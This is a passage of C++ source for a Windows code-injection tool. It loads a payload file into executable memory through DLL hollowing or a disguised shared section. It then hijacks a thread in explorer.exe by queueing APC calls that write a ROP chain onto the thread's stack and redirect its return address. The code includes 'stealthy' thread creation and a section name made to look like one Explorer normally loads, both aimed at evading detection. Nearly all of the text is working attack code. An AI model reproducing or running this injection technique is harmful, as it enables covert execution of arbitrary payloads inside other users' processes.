	strcpy((char*)&ROP_chain[rop_pos++], "n.dll\0");

	// this is the name of the memory map for the shmem
	ROP_chain[mapname] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
	// \\Sessions\\1\\BaseNamedObjects\\C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db
	strcpy((char*)&ROP_chain[rop_pos++], "Local\\C:");
	strcpy((char*)&ROP_chain[rop_pos++], "*Program");
	strcpy((char*)&ROP_chain[rop_pos++], "Data*Mic");
	strcpy((char*)&ROP_chain[rop_pos++], "rosoft*W");
	strcpy((char*)&ROP_chain[rop_pos++], "indows*C");
	strcpy((char*)&ROP_chain[rop_pos++], "aches*{D");
	strcpy((char*)&ROP_chain[rop_pos++], "DF571F2-");
	strcpy((char*)&ROP_chain[rop_pos++], "BE98-426");
	strcpy((char*)&ROP_chain[rop_pos++], "D-8828-1");
	strcpy((char*)&ROP_chain[rop_pos++], "A9A39C3F");
	strcpy((char*)&ROP_chain[rop_pos++], "DA2}.2.v");
	strcpy((char*)&ROP_chain[rop_pos++], "er0x0000");
	strcpy((char*)&ROP_chain[rop_pos++], "00000000");
	strcpy((char*)&ROP_chain[rop_pos++], "0001.db\0");


	ROP_chain[rop_pos++] = DONT_CARE;

	ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
	ROP_chain[rop_pos++] = DONT_CARE;

	// Update Runtime Parameters with ROP-specific Parameters
	runtime_parameters["saved_return_address"] = saved_return_address;
	runtime_parameters["GADGET_pivot"] = GADGET_pivot;
	runtime_parameters["rop_pos"] = rop_pos;

	output->buffer = ROP_chain;
	output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
	output->metadata = &runtime_parameters;

	return output;
}


int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {

	std::vector<std::wstring> Args(&pArgv[0], &pArgv[0 + nArgc]);
	HMODULE	hSelfModule = GetModuleHandleA(nullptr);

	if (nArgc < 3) {
		HRSRC hResourceInfo;
		HGLOBAL hResourceData;
		char* pRsrcData = nullptr;
		uint32_t dwRsrcSize;

		if ((hResourceInfo = FindResourceA(hSelfModule, "IDR_USAGE_TEXT", (LPCSTR)RT_RCDATA))) {
			if ((hResourceData = LoadResource(hSelfModule, hResourceInfo))) {
				dwRsrcSize = SizeofResource(hSelfModule, hResourceInfo);
				pRsrcData = (char*)LockResource(hResourceData);
				std::unique_ptr<uint8_t[]> RsrcBuf = std::make_unique<uint8_t[]>(dwRsrcSize + 1); // Otherwise the resource text may bleed in to the rest of the .rsrc section
				memcpy(RsrcBuf.get(), pRsrcData, dwRsrcSize);
				printf("%s\r\n", pRsrcData);
				system("Pause");
			}
		}
	}

	bool bTxF = true;

	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
	NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
	NtCreateTransaction = (NtCreateTransaction_t)GetProcAddress(hNtdll, "NtCreateTransaction");
	NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");
	NtExtendSection = (NtExtendSection_t)GetProcAddress(hNtdll, "NtExtendSection");

	std::wstring PayloadFilePath;
	int32_t alloc_type = -1;
	int32_t exec_method = -1;
	int32_t dwTargetTid = -1;
	bool unmap_after_exec = false;
	bool vp_to_rx = false;

	for (std::vector<std::wstring>::const_iterator ItrArg = Args.begin(); ItrArg != Args.end(); ++ItrArg) {
		std::wstring Arg = *ItrArg;
		transform(Arg.begin(), Arg.end(), Arg.begin(), ::tolower);

		if (Arg == L"--alloc-type") {
			if (*(ItrArg + 1) == L"dll-map-hollow") {
				alloc_type = 0;
				bTxF = false;
			}
			else if (*(ItrArg + 1) == L"txf-dll-map-hollow") {
				alloc_type = 1;
				bTxF = true;
			}
			else if (*(ItrArg + 1) == L"mapped") {
				alloc_type = 2;
			}
		}
		else if (Arg == L"--exec-method") {
			if (*(ItrArg + 1) == L"call") {
				exec_method = 0;
			}
			else if (*(ItrArg + 1) == L"create-thread") {
				exec_method = 1;
			}
			else if (*(ItrArg + 1) == L"create-thread-stealthy") {
				exec_method = 2;
			}
		}
		else if (Arg == L"--target-tid") {
			dwTargetTid = _wtoi((*(ItrArg + 1)).c_str());
		}
		else if (Arg == L"--RWX-to-RX") {
			vp_to_rx = true;
		}
		else if (Arg == L"--payload-file") {
			PayloadFilePath = *(ItrArg + 1);
		}
		else if (Arg == L"--unmap-after-exec") {
			unmap_after_exec = true;
		}
	}

	if (alloc_type == -1) {
		alloc_type = 2;
		printf("No allocation type specified - using \"mapped\"\r\n");
	}

	if (exec_method == -1) {
		exec_method = 0;
		printf("No exec type specified - using \"same thread\"\r\n");
	}

	if (dwTargetTid == -1) {
		printf("No target TID specified - targeting Explorer.exe thread w/ start address Explorer.exe+0x8b110\r\n");
	}
	else {
		printf("Targeting user specified TID - the thread must be alertable");
	}

	if (exec_method == 2) {
		if (dwTargetTid == -1) {
			printf("Cannot target Explorer.exe w/ option \"create-thread-stealthy\" - CFG will cause Explorer to crash\r\n");
			return 0;
		}
	}

	if (vp_to_rx) {
		printf("RWX memory will be VirtualProtected to RX - note that dynamically self-decrypting payloads cannot be executed from RX memory");
	}

	if (alloc_type == 1) {
		vp_to_rx = true;
	}

	if (PayloadFilePath.empty()) {
		printf("Must specify a payload path\r\n");
		return 0;
	}


	bool is_image_backed = false;


	HANDLE hFile = INVALID_HANDLE_VALUE;
	uint32_t dwFileSize = 0;
	uint8_t* pFileBuf = nullptr;
	uint32_t dwBytesRead;

	if ((hFile = CreateFileW(PayloadFilePath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr)) != INVALID_HANDLE_VALUE) {
		dwFileSize = GetFileSize(hFile, nullptr);
		pFileBuf = new uint8_t[dwFileSize];
		printf("... successfully opened payload file %ws (size: %d)\r\n", PayloadFilePath.c_str(), dwFileSize);
		ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesRead, nullptr);
	}
	else {
		printf("... failed to open %ws (error %d)\r\n", PayloadFilePath.c_str(), GetLastError());
		return 0;
	}

	if (bTxF && NtCreateTransaction == nullptr) {
		bTxF = false;
		printf("- TxF is not handled on this system. Changing alloc_type to \"dll-map-hollow\".\r\n");
	}

	uint8_t* pMapBuf = nullptr, * pMappedCode = nullptr;
	uint64_t qwMapBufSize;
	uint8_t* prMapBuf = nullptr, * prMappedCode = nullptr;

	if (alloc_type == 0 || alloc_type == 1) {
		if (alloc_type == 0) {
			printf("Locating suitable image for dll-map-hollow...\r\n");
		}
		else {
			printf("Locating suitable image for txf-dll-map-hollow...\r\n");
		}
		HollowDLL(&pMapBuf, &qwMapBufSize, (uint8_t*)pFileBuf, dwFileSize, &pMappedCode, &prMapBuf, &prMappedCode, 0, bTxF, vp_to_rx);
		is_image_backed = true;
	}
	else {
		//do the standard mapping
		HANDLE hSection = nullptr;
		NTSTATUS NtStatus;
		LARGE_INTEGER max_size;
		max_size.QuadPart = dwFileSize + 4000;

		OBJECT_ATTRIBUTES LocalAttributes;
		UNICODE_STRING szName;
		RtlInitUnicodeString2 = (MyRtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll"), "RtlInitUnicodeString");

		// Section name: "C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db" (name similar to sections commonly loaded by Explorer)
		RtlInitUnicodeString2(&szName, L"\\Sessions\\1\\BaseNamedObjects\\C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db");
		InitializeObjectAttributes(&LocalAttributes, &szName, OBJ_CASE_INSENSITIVE, NULL, NULL);
		NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &LocalAttributes, &max_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);

		qwMapBufSize = 0;
		NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)&pMapBuf, 0, 0, nullptr, (PSIZE_T)&qwMapBufSize, 1, 0, PAGE_EXECUTE_READWRITE);
		uint32_t dwOldProtect = 0;
		memcpy(pMapBuf, pFileBuf, dwFileSize); // this is where we could do the XOR thing
		if (vp_to_rx) {
			VirtualProtect(pMapBuf, qwMapBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect);
		}
	}

	HANDLE t = nullptr;
	if (dwTargetTid != -1) {
		t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, (DWORD)dwTargetTid);
	}
	else {
		//grab the proper explorer TID programmatcially
		// First need to grab explorer PID
		DWORD epid;
		std::wstring target_process = stringToWstring("explorer.exe");
		epid = getPID(target_process);

		// then can get start address of Explorer.exe image, so we can obtain the address of Explorer.exe+0x8b110 
		DWORD64 target_thread_addr;
		HMODULE hMods[1024];
		DWORD cbNeeded;
		unsigned int i;
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
			PROCESS_VM_READ,
			FALSE, epid);
		const TCHAR* explorerStr = TEXT("C:\\Windows\\Explorer.exe");
		if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
		{
			for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
			{
				TCHAR szModName[MAX_PATH];

				// Get the full path to the module's file.

				if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
					sizeof(szModName) / sizeof(TCHAR)))
				{
					// Check if it matches explorer
					if (_tcscmp(szModName, explorerStr) != 0) {
						target_thread_addr = (DWORD64)(hMods[i]) + 569616; //Explorer.exe+0x8b110 (KB4586781)
						break;
					}
					//printf("%s (0x%08X)\n", szModName, hMods[i]);
				}
			}
		}

		// then can get the start addresses of each thread to find the proper target
		std::vector<DWORD64> ex_tids = EnumThreads(L"explorer.exe");
		for (i = 0; i < sizeof(ex_tids); i++) {
			HANDLE tt = OpenThread(THREAD_QUERY_INFORMATION, FALSE, ex_tids[i]);
			DWORD64 thread_start = NULL;
			DWORD return_length = 0;
			NTSTATUS NtStatus;
			NTQUERYINFORMATIONTHREAD NtQueryInformationThread = NULL;
			NtQueryInformationThread = (NTQUERYINFORMATIONTHREAD)GetProcAddress(hNtdll, "NtQueryInformationThread");
			NtStatus = NtQueryInformationThread(tt, 9, &thread_start, sizeof(thread_start), &return_length);
			if ((DWORD64)thread_start == target_thread_addr) {
				CloseHandle(tt);
				dwTargetTid = ex_tids[i];
				t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, dwTargetTid);
				break;
			}
		}
	}

	printf("Targeting thread ID %d\r\n", dwTargetTid);
	printf("Suspending thread\r\n");
	SuspendThread(t);

	CONTEXT context;
	TStrDWORD64Map runtime_parameters;
	context.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(t, &context))
	{
		printf("GetThreadContext failed with error 0x%08x\r\n", GetLastError());
		return 0;
	}

	runtime_parameters["orig_tos"] = (DWORD64)context.Rsp;
	runtime_parameters["tos"] = runtime_parameters["orig_tos"] - 0x2000;

	HMODULE ntdll = GetModuleHandleA("ntdll");
	PINJECTRA_PACKET* payload_output;

	// Evaluate Payload
	printf("Building ROP chain...\r\n");
	payload_output = BuildROPChain(runtime_parameters, qwMapBufSize, is_image_backed, exec_method, unmap_after_exec, vp_to_rx); //map size, is_image_backed, exec option, unmap option
	TStrDWORD64Map& tMetadata = *payload_output->metadata;

	DWORD64 orig_tos = tMetadata["orig_tos"];
	DWORD64 tos = tMetadata["tos"];
	DWORD64 rop_pos = tMetadata["rop_pos"];
	DWORD64* ROP_chain = (DWORD64*)payload_output->buffer;
	DWORD64 saved_return_address = tMetadata["saved_return_address"];
	DWORD64 GADGET_pivot = tMetadata["GADGET_pivot"];

	printf("Beginning stack bomb\r\n");

	NtQueueApcThread = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, __int64)) GetProcAddress(ntdll, "NtQueueApcThread");

	// Grow the stack to accommodate the new stack
	for (DWORD64 i = orig_tos - 0x1000; i >= tos; i -= 0x1000)
	{
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(i), (void*)0, 1);
	}

	// Write the new stack
	for (int i = 0; i < rop_pos * sizeof(DWORD64); i++)
	{
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(tos + i), (void*)*(((BYTE*)ROP_chain) + i), 1);
	}
	// Save the original return address into the new stack
	(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memmove"), (void*)(ROP_chain[saved_return_address]), (void*)orig_tos, 8);

	// overwrite the original return address with GADGET_pivot
	for (int i = 0; i < sizeof(tos); i++)
	{
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos + i), (void*)(((BYTE*)&GADGET_pivot)[i]), 1);
	}
	// overwrite the original tos+8 with the new tos address (we don't need to restore this since it's shadow stack!
	for (int i = 0; i < sizeof(tos); i++)
	{
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos + 8 + i), (void*)(((BYTE*)&tos)[i]), 1);
	}

	printf("Resuming thread - payload should execute!");
	ResumeThread(t);
	Sleep(10000); //if we don't sleep, the only handle to the payload section may get closed before the target thread can obtain it
	return 0;
}




